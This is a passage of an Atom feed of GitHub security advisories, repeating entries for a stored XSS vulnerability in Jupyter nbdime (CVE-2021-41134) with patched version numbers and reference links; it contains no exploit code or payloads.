<li><a href="https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>
<li><a href="https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41134">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-08T18:09:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbdime-jupyterlab] Stored XSS in Jupyter nbdime]]></title>
        <id>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</id>
        <link href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4"/>
        <updated>2024-10-01T19:31:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>
<h3 id="patches">Patches</h3>
<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>
<h4 id="python">Python</h4>
<ul>
<li>nbdime 1.x: Patched in v. 1.1.1</li>
<li>nbdime 2.x: Patched in v. 2.1.1</li>
<li>nbdime 3.x: Patched in v. 3.1.1</li>
</ul>
<h4 id="npm">npm</h4>
<ul>
<li>nbdime 6.x version: Patched in 6.1.2</li>
<li>nbdime 5.x version: Patched in 5.0.2</li>
<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>
<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@ipython.org">security@ipython.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>
<li><a href="https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41134">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-08T18:09:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nbdime] Stored XSS in Jupyter nbdime]]></title>
        <id>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</id>
        <link href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4"/>
        <updated>2024-10-01T19:31:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>
<h3 id="patches">Patches</h3>
<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>
<h4 id="python">Python</h4>
<ul>
<li>nbdime 1.x: Patched in v. 1.1.1</li>
<li>nbdime 2.x: Patched in v. 2.1.1</li>
<li>nbdime 3.x: Patched in v. 3.1.1</li>
</ul>
<h4 id="npm">npm</h4>
<ul>
<li>nbdime 6.x version: Patched in 6.1.2</li>
<li>nbdime 5.x version: Patched in 5.0.2</li>
<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>
<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@ipython.org">security@ipython.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>
<li><a href="https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41134">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-p6rw-44q7-3fw4">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6rw-44q7-3fw4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-11-08T18:09:27.000Z</published>
    </entry>
</feed>